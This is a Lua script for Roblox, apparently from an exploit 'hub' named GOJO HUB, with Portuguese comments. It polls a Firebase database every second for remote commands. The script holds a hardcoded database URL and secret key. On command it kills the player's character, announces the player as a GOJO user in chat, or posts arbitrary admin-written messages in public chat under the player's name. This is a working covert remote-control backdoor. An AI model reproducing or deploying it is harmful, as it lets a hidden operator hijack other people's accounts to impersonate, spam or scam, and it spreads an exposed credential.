-- ↓ Configurações e serviços
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local playerName = player.Name

local firebaseUrl = "https://gojo-hub-default-rtdb.firebaseio.com/"
local secretKey = "tAxUKU1BgidFb2xFco4FRYYz02y86gUw8ugZNjYf"

-- ↓ Função para enviar chat local e global
local function sendChatMessage(message)
    pcall(function()
        local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
        if channel then
            channel:SendAsync(message)
        else
            local chatEvent = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
            chatEvent:FireServer(message, "All")
        end
    end)
end

-- ↓ Função para reiniciar personagem (kill)
local function respawnPlayer()
    if player and player.Character then
        local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.Health = 0
        else
            player.Character:Destroy()
        end
        warn("[GOJO HUB] Comando kill executado: personagem reiniciado.")
    end
end

-- ↓ Checar comando kill do Firebase
local function checkKillCommand()
    local success, response = pcall(function()
        local url = firebaseUrl.."commands/kill_player.json?auth="..secretKey
        return game:HttpGet(url)
    end)

    if success and response and response ~= "null" then
        local data = HttpService:JSONDecode(response)
        if data.target == playerName and data.extra and data.extra.action == "kill" then
            respawnPlayer()
            -- Deleta comando após executar
            pcall(function()
                local requestFunc = (syn and syn.request) or http_request or request or (fluxus and fluxus.request) or http.request
                if requestFunc then
                    requestFunc({
                        Url = firebaseUrl.."commands/kill_player.json?auth="..secretKey,
                        Method = "DELETE",
                        Headers = { ["Content-Type"]="application/json" },
                    })
                end
            end)
        end
    end
end

-- ↓ Checar comando verifique
local function checkVerifiqueCommand()
    local success, response = pcall(function()
        return game:HttpGet(firebaseUrl.."commands/verifique.json?auth="..secretKey)
    end)

    if success and response and response ~= "null" then
        sendChatMessage("GOJO_user")
        -- Deleta comando do Firebase
        pcall(function()
            local requestFunc = (syn and syn.request) or http_request or request or (fluxus and fluxus.request) or http.request
            if requestFunc then
                requestFunc({
                    Url = firebaseUrl.."commands/verifique.json?auth="..secretKey,
                    Method = "DELETE",
                    Headers = { ["Content-Type"]="application/json" },
                })
            end
        end)
    end
end

-- ↓ Checar comando de chat do admin
local function checkChatCommand()
    local success, response = pcall(function()
        return game:HttpGet(firebaseUrl.."commands/send_message.json?auth="..secretKey)
    end)

    if success and response and response ~= "null" then
        local data = HttpService:JSONDecode(response)
        if data.target == playerName and data.message then
            sendChatMessage(data.message)
            print("[GOJO HUB] Mensagem do admin enviada: "..data.message)
        end
        -- Deleta comando
        pcall(function()
            local requestFunc = (syn and syn.request) or http_request or request or (fluxus and fluxus.request) or http.request
            if requestFunc then
                requestFunc({
                    Url = firebaseUrl.."commands/send_message.json?auth="..secretKey,
                    Method = "DELETE",
                    Headers = { ["Content-Type"]="application/json" },
                })
            end
        end)
    end
end

-- ↓ Loop principal em background (24/7)
task.spawn(function()
    while true do
        task.wait(1) -- verifica a cada 1 segundo
        checkKillCommand()
        checkVerifiqueCommand()
        checkChatCommand()
    end
end)
